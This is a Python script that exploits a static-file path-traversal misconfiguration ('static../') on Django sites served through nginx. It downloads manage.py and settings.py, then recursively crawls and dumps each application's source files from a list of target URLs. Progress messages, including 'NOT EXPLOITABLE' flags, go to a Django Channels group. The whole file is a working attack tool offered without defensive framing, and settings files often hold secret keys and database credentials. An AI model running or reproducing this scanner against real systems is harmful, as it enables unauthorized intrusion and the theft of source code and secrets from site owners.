from colorama import init
from termcolor import colored
import requests
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
import json
import sys
import requests
import os
import errno
import re
import imp
import argparse
import requests , optparse , concurrent.futures , urllib3

from os import path

channel_layer = get_channel_layer()
output_lines = []

def clear_data():
    output_lines.clear()

def send(data):
    # message_data = json.dumps(data)
    # message_text = message_data.encode("utf-8")
    async_to_sync(channel_layer.group_send)(
            "output",  # Replace with a unique group name
            {
                "type": "send_output",
                "text": json.dumps(data)
            }
        )


requests.packages.urllib3.disable_warnings()


def mkdirp(path):
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else:
            raise


def escape_url(text):
    return text.replace('://', '-').replace(':', '-').replace('/', '-')


class Cacher:
    NONEXIST_FILE_PATH = 'cache__nonexist.txt'


    def is_nonexist(file):
        if not os.path.exists(Cacher.NONEXIST_FILE_PATH):
            open(Cacher.NONEXIST_FILE_PATH, 'w').write('')
        nonexist_files = open(Cacher.NONEXIST_FILE_PATH, 'r').read().split('\n')
        return file in nonexist_files


    def add_to_nonexist(file):
        open(Cacher.NONEXIST_FILE_PATH, 'a').write(file + '\n')


class Dumper:

    def get(url, path):
        file_dst = Dumper._resolve_dump_file_path(url, path)
        if Cacher.is_nonexist(file_dst):
            return None
        elif os.path.exists(file_dst):
            return open(file_dst, 'r').read()
        else:
            content = Dumper.download(url, path)
            if content is None:
                Cacher.add_to_nonexist(file_dst)
            return content


    def download(url, path):
        file_dst = Dumper._resolve_dump_file_path(url, path)
        if os.path.exists(file_dst):
            return

        url = '{0}static../{1}'.format(url, path)
        try:
            res = requests.get(url, verify=False)
        except:
            return None

        if res.status_code == 200 and res.text:
            output_lines.append( {"content":'[+] downloading: {}'.format(file_dst)})
            send(output_lines )
         
       
            mkdirp(os.path.dirname(file_dst))
            with open(file_dst, 'w') as file:
                file.write(res.text)
            return res.text
        else:
            return None



    def _resolve_dump_file_path(url, path):
        return op+'dump/{0}/{1}'.format(escape_url(url), path)


class Parser:

    def parse_main_module(manage_py_content):
        try:
            return manage_py_content.split('''os.environ.setdefault("DJANGO_SETTINGS_MODULE"''')[1].split('"')[1][:-len('settings') - 1]
        except:
            return None


    def parse_installed_apps(settings_content):
        if not settings_content:
            return None
        bracket = ']' if '[' in settings_content.split('INSTALLED_APPS')[1].split('\n')[0] else ')'
        x = settings_content.split('INSTALLED_APPS')[1].split(bracket)[0].split('\n')
        y = []
        for app in x:
            if "'" in app or '"' in app:
                if 'django' not in app:
                    app = app.split('#')[0].strip()
                    y.append(app.strip().replace('"', '').replace("'", '').replace(',', ''))
        return y


    def infer_modules(code, curr_dir=None):
        while '..' in curr_dir:
            curr_dir = curr_dir.replace('..', '.')

        potential_modules = set()

        r = r'from\s*(.*)\s*import\s*(.*)'
        matches = re.findall(r, code)
        for match in matches:
            righties = [x.strip() for x in match[1].split(',')]
            lefty = match[0].strip()

            if lefty == '':
                for righty in righties:
                    potential_modules.add(righty)

            else:
                if lefty == '.' and curr_dir:
                    for righty in righties:
                        potential_modules.add(curr_dir + '.' + righty)
                else:
                    for righty in righties:
                        potential_modules.add(lefty.strip() + '.' + righty)

        r = r'\s*import\s*(.*)'
        matches = re.findall(r, code)
        for match in matches:
            righties = [x.strip() for x in match.split(',')]

            for righty in righties:
                potential_modules.add(righty)

        r = r'include\(\s*[\'\"]([^\s]*)[\'\"].*'
        matches = re.findall(r, code)
        for match in matches:
            potential_modules.add(match.strip())

        r = r'url\(.*[\'\"]\s*,\s*[\'\"]([^\'\"]*)[\'\"]'
        matches = re.findall(r, code)
        for match in matches:
            potential_modules.add(match)

        r = r'url\(.*[\'\"]\s*,\s*([^\'\"\s\(\)]*),+'
        matches = re.findall(r, code)
        for match in matches:
            potential_modules.add(match)

        new_potential_modules = set()
        for module in potential_modules:
            if module == '': continue
            if 'django' in module: continue
            if ' ' in module: continue
            if ')' in module: continue
            if '(' in module: continue
            module_segment = module.split('.')

            try:
                imp.find_module(module_segment[0])
                continue
            except:
                pass

            if module_segment[0] == '':
                module_segment[0] = curr_dir

            for i in range(len(module_segment)):
                new_potential_modules.add('.'.join(module_segment[:i + 1]))

        return sorted(list(new_potential_modules))


class Crawler:
    COMMON_FILES = ['manage.py', 'config.py', 'views.py', 'views/__init__.py']
    COMMON_FILES_IN_MODULE = ['__init__.py', 'settings.py', 'urls.py', 'wsgi.py','asgi.py',
                              'admin.py', 'apps.py', 'helper.py', 'models.py', 'tasks.py',
                              'tests.py', 'views.py', 'migrations/0001_initial.py', 'migrations/__init__.py']

  
    def _module_name_to_path(m):
        return m.replace('.', '/')


    def _get_module_name_from_path(path):
        structures = path.split('/')
        return '.'.join(structures[:-1])


    def _crawl_expand(url, initial_files):
        candidate_files = set(initial_files)
        checked_files = set()

        while True:
            if checked_files == candidate_files:
                break

            new_files = set()
            for f in candidate_files:
                if f in checked_files:
                    continue
                checked_files.add(f)
                content = Dumper.get(url, f)
                if not content:
                    continue
                module_name = Crawler._get_module_name_from_path(f)
                inferred_modules = Parser.infer_modules(content, module_name)
                for m in inferred_modules:
                    mp = Crawler._module_name_to_path(m)
                    new_files.add('{}.py'.format(mp))
                    new_files.update(['{}/{}'.format(mp, c) for c in Crawler.COMMON_FILES_IN_MODULE])

            candidate_files.update(new_files)

 
    def crawl(url):
        output_lines.append({"content":'[+] START CRAWLING: ' + url})
        send(output_lines )
     
        candidate_files = set(Crawler.COMMON_FILES)

        content_manage_py = Dumper.get(url, 'manage.py')
        if content_manage_py is None:
            output_lines.append({"content":'[+] NOT EXPLOITABLE: ' + url})
            send(output_lines )
            return

        main_module = Parser.parse_main_module(content_manage_py)
        if main_module is None:
       
            output_lines.append( {"content":'[+] NOT EXPLOITABLE: ' + url})
            send(output_lines )
            return

        main_module_path = Crawler._module_name_to_path(main_module)

        content_settings_py = Dumper.get(url, '{}/settings.py'.format(main_module_path))
        app_modules = Parser.parse_installed_apps(content_settings_py)

        for m in app_modules + [main_module]:
            mp = Crawler._module_name_to_path(m)
            candidate_files.add('{}.py'.format(mp))
            candidate_files.update(['{}/{}'.format(mp, c) for c in Crawler.COMMON_FILES_IN_MODULE])

        Crawler._crawl_expand(url, initial_files=candidate_files)

    
 
        output_lines.append( {"content":'[+] FINISHED: ' + url})
        send(output_lines )

def check(url_path,output_path):
    global op
    op =output_path

    if not os.path.exists(url_path):
        raise
    

    targets = open(url_path).read().split('\n')
    for target in targets:
        Crawler.crawl(target)
   

